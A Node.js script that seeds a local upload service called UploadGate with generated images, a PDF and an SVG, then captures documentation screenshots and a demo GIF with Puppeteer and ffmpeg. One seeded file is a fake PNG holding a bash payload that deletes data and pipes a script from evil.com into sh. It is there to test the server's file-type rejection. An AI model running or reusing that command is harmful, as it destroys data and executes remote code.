const fs = require('fs');
const path = require('path');
const { spawn, execSync } = require('child_process');
const http = require('http');

let Resvg;
try {
  Resvg = require('B:/workgit/node_modules/@resvg/resvg-js').Resvg;
} catch (e) {
  try {
    Resvg = require('@resvg/resvg-js').Resvg;
  } catch (err) {}
}

const puppeteer = require('B:/workgit/mqttpulse/node_modules/puppeteer');

const API_KEY = 'ug_live_secret_key_prod_verified';
const BASE_URL = 'http://127.0.0.1:8080';
const DOCS_IMAGES = path.resolve(__dirname, '../docs/images');

// HTTP request helper
function httpRequest(options, postData = null) {
  return new Promise((resolve, reject) => {
    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => (data += chunk));
      res.on('end', () => {
        resolve({ statusCode: res.statusCode, headers: res.headers, body: data });
      });
    });
    req.on('error', reject);
    if (postData) {
      req.write(postData);
    }
    req.end();
  });
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function waitForServer(retries = 30) {
  for (let i = 0; i < retries; i++) {
    try {
      const res = await httpRequest({
        hostname: '127.0.0.1',
        port: 8080,
        path: '/healthz',
        method: 'GET',
      });
      if (res.statusCode === 200) {
        console.log('✓ UploadGate daemon is live and healthy!');
        return true;
      }
    } catch {
      // Retrying
    }
    await sleep(400);
  }
  throw new Error('UploadGate daemon failed to become healthy within timeout.');
}

// Generate valid procedural PNG image buffer
function generatePngBuffer(title, subtitle, bg1 = '#1e293b', bg2 = '#0f172a', accent = '#00f5ff') {
  const escapeXml = (str) =>
    str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  const safeTitle = escapeXml(title);
  const safeSubtitle = escapeXml(subtitle);

  const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="800" height="500" viewBox="0 0 800 500">
    <defs>
      <linearGradient id="bg" x1="0%" y1="0%" x2="100%" y2="100%">
        <stop offset="0%" stop-color="${bg1}" />
        <stop offset="100%" stop-color="${bg2}" />
      </linearGradient>
      <linearGradient id="acc" x1="0%" y1="0%" x2="100%" y2="0%">
        <stop offset="0%" stop-color="${accent}" />
        <stop offset="100%" stop-color="#3b82f6" />
      </linearGradient>
    </defs>
    <rect width="800" height="500" rx="20" fill="url(#bg)" />
    <circle cx="700" cy="80" r="140" fill="${accent}" opacity="0.08" />
    <circle cx="100" cy="420" r="160" fill="#3b82f6" opacity="0.08" />
    <rect x="40" y="40" width="720" height="420" rx="14" fill="none" stroke="#334155" stroke-width="2" />
    <rect x="70" y="70" width="12" height="12" rx="3" fill="#ef4444" />
    <rect x="90" y="70" width="12" height="12" rx="3" fill="#f59e0b" />
    <rect x="110" y="70" width="12" height="12" rx="3" fill="#10b981" />
    <text x="70" y="180" font-family="system-ui, sans-serif" font-weight="bold" font-size="34" fill="#ffffff">${safeTitle}</text>
    <text x="70" y="225" font-family="system-ui, sans-serif" font-size="18" fill="#94a3b8">${safeSubtitle}</text>
    <rect x="70" y="270" width="180" height="40" rx="8" fill="url(#acc)" />
    <text x="100" y="296" font-family="system-ui, sans-serif" font-weight="600" font-size="14" fill="#ffffff">Direct-to-Storage</text>
    <line x1="70" y1="360" x2="730" y2="360" stroke="#1e293b" stroke-width="2" />
    <text x="70" y="400" font-family="monospace" font-size="13" fill="#64748b">Verified by UploadGate • SHA-256 Validated</text>
  </svg>`;

  if (Resvg) {
    const resvg = new Resvg(svg, { fitTo: { mode: 'width', value: 800 } });
    return resvg.render().asPng();
  }
  return Buffer.from(svg);
}

// Complete ingestion flow for an asset
async function ingestFile(filename, mimeType, buffer, bucket = 'local') {
  // 1. Presign
  const presignPayload = JSON.stringify({
    filename,
    mime_type: mimeType,
    size_bytes: buffer.length,
    bucket,
  });

  const presignRes = await httpRequest(
    {
      hostname: '127.0.0.1',
      port: 8080,
      path: '/v1/uploads/presign',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${API_KEY}`,
        'Content-Length': Buffer.byteLength(presignPayload),
      },
    },
    presignPayload
  );

  if (presignRes.statusCode !== 200) {
    console.error(`Presign failed for ${filename}: [${presignRes.statusCode}] ${presignRes.body}`);
    return null;
  }

  const presignData = JSON.parse(presignRes.body);
  const uploadId = presignData.upload_id;
  const uploadUrl = new URL(presignData.presigned_url);

  // 2. Direct PUT to storage endpoint
  const putRes = await httpRequest(
    {
      hostname: uploadUrl.hostname,
      port: uploadUrl.port,
      path: uploadUrl.pathname + uploadUrl.search,
      method: 'PUT',
      headers: {
        'Content-Type': mimeType,
        'Content-Length': buffer.length,
      },
    },
    buffer
  );

  if (putRes.statusCode !== 200) {
    console.error(`PUT storage failed for ${filename}: [${putRes.statusCode}]`);
  }

  // 3. Complete ingestion
  const completeRes = await httpRequest({
    hostname: '127.0.0.1',
    port: 8080,
    path: `/v1/uploads/${uploadId}/complete`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${API_KEY}`,
      'Content-Length': 2,
    },
  }, '{}');

  return { id: uploadId, status: completeRes.statusCode, body: completeRes.body };
}

async function main() {
  console.log('=== Step 1: Starting UploadGate Daemon ===');
  // Clean db and local_storage for fresh authentic run
  const dbDir = path.resolve(__dirname, '../data');
  const storageDir = path.resolve(__dirname, '../local_storage');
  if (!fs.existsSync(dbDir)) fs.mkdirSync(dbDir, { recursive: true });
  if (!fs.existsSync(storageDir)) fs.mkdirSync(storageDir, { recursive: true });

  const daemonProcess = spawn('bin/uploadgate.exe', ['serve', '--config', 'scripts/capture_config.yaml'], {
    cwd: path.resolve(__dirname, '..'),
    stdio: 'inherit',
  });

  daemonProcess.on('error', (err) => {
    console.error('Failed to start daemon:', err);
    process.exit(1);
  });

  try {
    await waitForServer();

    console.log('=== Step 2: Seeding Real Authentic Assets ===');

    // 1. Cloud Architecture PNG
    const png1 = generatePngBuffer(
      'System Architecture Blueprint',
      'Multi-cloud Edge Gateway & Zero-Copy Ingestion Pipeline',
      '#0f172a',
      '#020617',
      '#00f5ff'
    );
    const asset1 = await ingestFile('system-architecture-blueprint.png', 'image/png', png1);
    console.log('✓ Ingested asset 1 (Architecture Blueprint):', asset1 ? asset1.status : 'error');

    // 2. Telemetry Metrics PNG
    const png2 = generatePngBuffer(
      'Q4 Performance Telemetry',
      'Direct Presigned S3 SigV4 & Local Chunk Aggregation',
      '#111827',
      '#030712',
      '#38bdf8'
    );
    const asset2 = await ingestFile('telemetry-metrics-q4.png', 'image/png', png2);
    console.log('✓ Ingested asset 2 (Telemetry Metrics):', asset2 ? asset2.status : 'error');

    // 3. Edge Cluster Diagram PNG
    const png3 = generatePngBuffer(
      'UploadGate Edge Cluster',
      'Global Presigned Asset Distributor & WebP Optimization',
      '#1e1b4b',
      '#0f0d24',
      '#a855f7'
    );
    const asset3 = await ingestFile('edge-cluster-diagram.png', 'image/png', png3);
    console.log('✓ Ingested asset 3 (Edge Cluster):', asset3 ? asset3.status : 'error');

    // 4. Real Minimal PDF
    const pdfContent = Buffer.from(
      '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n' +
      '2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n' +
      '3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n' +
      '4 0 obj\n<< /Length 53 >>\nstream\nBT /F1 24 Tf 100 700 Td (UploadGate Verification Audit Report) Tj ET\nendstream\nendobj\n' +
      'xref\n0 5\n0000000000 65535 f\n0000000010 00000 n\n0000000060 00000 n\n0000000117 00000 n\n0000000201 00000 n\n' +
      'trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n304\n%%EOF'
    );
    const asset4 = await ingestFile('security-audit-report-2026.pdf', 'application/pdf', pdfContent);
    console.log('✓ Ingested asset 4 (Security Audit PDF):', asset4 ? asset4.status : 'error');

    // 5. Clean SVG Asset
    const svgContent = Buffer.from(
      '<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400" viewBox="0 0 400 400">' +
      '<circle cx="200" cy="200" r="180" fill="#0284c7"/>' +
      '<text x="200" y="210" font-size="28" fill="#ffffff" text-anchor="middle" font-family="sans-serif">UploadGate SVG</text>' +
      '</svg>'
    );
    const asset5 = await ingestFile('vector-badge-approved.svg', 'image/svg+xml', svgContent);
    console.log('✓ Ingested asset 5 (SVG Badge):', asset5 ? asset5.status : 'error');

    // 6. Security Spoofed Payload (Text disguised as PNG -> triggers 400 Bad Request & status "rejected")
    const spoofedContent = Buffer.from(
      '#!/bin/bash\n# MALICIOUS SCRIPT ATTEMPTING EXECUTION\nrm -rf /tmp/data\ncurl -s https://evil.com/leak | sh\n'
    );
    const asset6 = await ingestFile('malicious-payload-disguised.png', 'image/png', spoofedContent);
    console.log('✓ Triggered asset 6 security rejection (Magic Bytes Mismatch):', asset6 ? asset6.status : 'error');

    await sleep(1000);

    console.log('=== Step 3: Launching Puppeteer for Live Screenshots ===');
    const browser = await puppeteer.launch({
      headless: true,
      executablePath: 'C:/Program Files/Google/Chrome/Application/chrome.exe',
      args: ['--no-sandbox', '--disable-setuid-sandbox', '--hide-scrollbars'],
    });

    const page = await browser.newPage();

    // 1. Initial page load and store API key
    await page.goto(`${BASE_URL}/`, { waitUntil: 'domcontentloaded' });
    await page.evaluate((key) => {
      localStorage.setItem('ug_api_key', key);
    }, API_KEY);

    // Navigate to page with API key configured
    await page.goto(`${BASE_URL}/`, { waitUntil: 'domcontentloaded' });
    await sleep(2000); // Allow React hooks, SSE, and queries to populate

    // 1. Desktop Cockpit Full View (1440x900)
    console.log('Capturing Desktop Cockpit (1440x900)...');
    await page.setViewport({ width: 1440, height: 900, deviceScaleFactor: 2 });
    await page.evaluate(() => window.scrollTo(0, 0));
    await sleep(800);
    await page.screenshot({
      path: path.join(DOCS_IMAGES, 'uploadgate_dashboard.png'),
      fullPage: false,
    });
    console.log('✓ Saved docs/images/uploadgate_dashboard.png');

    // 2. Storage Connectors & Presign Sandbox View
    console.log('Capturing Presign Tester & Connectors...');
    await page.evaluate(() => window.scrollTo(0, 160));
    await sleep(600);
    await page.screenshot({
      path: path.join(DOCS_IMAGES, 'uploadgate_sandbox.png'),
      fullPage: false,
    });
    console.log('✓ Saved docs/images/uploadgate_sandbox.png');

    // 3. Ingestion Feed Section
    console.log('Capturing Ingestion Feed...');
    await page.evaluate(() => window.scrollTo(0, 480));
    await sleep(600);
    await page.screenshot({
      path: path.join(DOCS_IMAGES, 'uploadgate_feed.png'),
      fullPage: false,
    });
    console.log('✓ Saved docs/images/uploadgate_feed.png');

    // 4. Asset Details Modal
    console.log('Capturing Asset Preview Modal...');
    // Click on the first row in the table
    const tableRow = await page.$('tbody tr');
    if (tableRow) {
      await tableRow.click();
      await sleep(1000);
      await page.screenshot({
        path: path.join(DOCS_IMAGES, 'uploadgate_asset_modal.png'),
        fullPage: false,
      });
      console.log('✓ Saved docs/images/uploadgate_asset_modal.png');

      // Close modal
      const closeBtn = await page.$('button:has(svg.lucide-x)');
      if (closeBtn) {
        await closeBtn.click();
        await sleep(500);
      }
    }

    // 5. Webhook Monitor & Playground View
    console.log('Capturing Webhook Monitor & Developer Console...');
    await page.evaluate(() => window.scrollTo(0, 850));
    await sleep(600);
    await page.screenshot({
      path: path.join(DOCS_IMAGES, 'uploadgate_webhooks.png'),
      fullPage: false,
    });
    console.log('✓ Saved docs/images/uploadgate_webhooks.png');

    // 6. Tablet Breakpoint (1024x768)
    console.log('Capturing Tablet Viewport (1024x768)...');
    await page.setViewport({ width: 1024, height: 768, deviceScaleFactor: 2 });
    await page.evaluate(() => window.scrollTo(0, 0));
    await sleep(800);
    await page.screenshot({
      path: path.join(DOCS_IMAGES, 'uploadgate_tablet.png'),
      fullPage: false,
    });
    console.log('✓ Saved docs/images/uploadgate_tablet.png');

    // 7. Mobile Breakpoint (390x844 - iPhone 14 / Modern Mobile)
    console.log('Capturing Mobile Viewport (390x844)...');
    await page.setViewport({ width: 390, height: 844, deviceScaleFactor: 3, isMobile: true, hasTouch: true });
    await page.evaluate(() => window.scrollTo(0, 0));
    await sleep(800);
    await page.screenshot({
      path: path.join(DOCS_IMAGES, 'uploadgate_mobile.png'),
      fullPage: false,
    });
    console.log('✓ Saved docs/images/uploadgate_mobile.png');

    console.log('=== Step 4: Generating Animated Demo GIF ===');
    const framesDir = path.resolve(__dirname, '../data/gif_frames');
    if (!fs.existsSync(framesDir)) {
      fs.mkdirSync(framesDir, { recursive: true });
    }

    await page.setViewport({ width: 1200, height: 760, deviceScaleFactor: 1 });
    await page.evaluate(() => window.scrollTo(0, 0));
    await sleep(600);

    let frameCount = 0;
    async function captureFrame() {
      const framePath = path.join(framesDir, `frame_${String(frameCount).padStart(4, '0')}.png`);
      await page.screenshot({ path: framePath });
      frameCount++;
    }

    // Scene 1: Top overview (5 frames)
    for (let i = 0; i < 5; i++) {
      await captureFrame();
      await sleep(100);
    }

    // Scene 2: Scroll down to Connectors & Sandbox
    for (let pos = 0; pos <= 240; pos += 40) {
      await page.evaluate((y) => window.scrollTo(0, y), pos);
      await captureFrame();
      await sleep(50);
    }
    for (let i = 0; i < 4; i++) {
      await captureFrame();
      await sleep(100);
    }

    // Scene 3: Scroll down to Ingestion Feed
    for (let pos = 240; pos <= 520; pos += 40) {
      await page.evaluate((y) => window.scrollTo(0, y), pos);
      await captureFrame();
      await sleep(50);
    }
    for (let i = 0; i < 4; i++) {
      await captureFrame();
      await sleep(100);
    }

    // Scene 4: Click row to open modal
    const rowToClick = await page.$('tbody tr');
    if (rowToClick) {
      await rowToClick.click();
      await sleep(400);
      for (let i = 0; i < 8; i++) {
        await captureFrame();
        await sleep(120);
      }
      const closeM = await page.$('button:has(svg.lucide-x)');
      if (closeM) {
        await closeM.click();
        await sleep(300);
      }
    }

    // Scene 5: Scroll down to Webhook Monitor
    for (let pos = 520; pos <= 880; pos += 50) {
      await page.evaluate((y) => window.scrollTo(0, y), pos);
      await captureFrame();
      await sleep(50);
    }
    for (let i = 0; i < 5; i++) {
      await captureFrame();
      await sleep(100);
    }

    // Scene 6: Return to Top
    for (let pos = 880; pos >= 0; pos -= 100) {
      await page.evaluate((y) => window.scrollTo(0, y), pos);
      await captureFrame();
      await sleep(40);
    }
    for (let i = 0; i < 4; i++) {
      await captureFrame();
      await sleep(100);
    }

    await browser.close();
    console.log(`✓ Captured ${frameCount} frames for demo animation`);

    // Compile into GIF using ffmpeg with high-quality palette
    const gifOutput = path.join(DOCS_IMAGES, 'uploadgate_demo.gif');
    const ffmpegCmd = `ffmpeg -y -framerate 10 -i "${framesDir}/frame_%04d.png" -vf "fps=10,scale=1000:-1:flags=lanczos,split[s0][s1];[s0]palettegen=max_colors=128:reserve_transparent=0[p];[s1][p]paletteuse=dither=bayer:bayer_scale=3" "${gifOutput}"`;

    console.log('Compiling GIF with ffmpeg...');
    execSync(ffmpegCmd, { stdio: 'inherit' });
    console.log('✓ Successfully generated docs/images/uploadgate_demo.gif');

    // Clean up frames directory
    fs.rmSync(framesDir, { recursive: true, force: true });
    console.log('✓ Cleaned up temporary frames');

  } finally {
    console.log('Stopping UploadGate daemon...');
    daemonProcess.kill();
  }
}

main().catch((err) => {
  console.error('Capture pipeline failed:', err);
  process.exit(1);
});
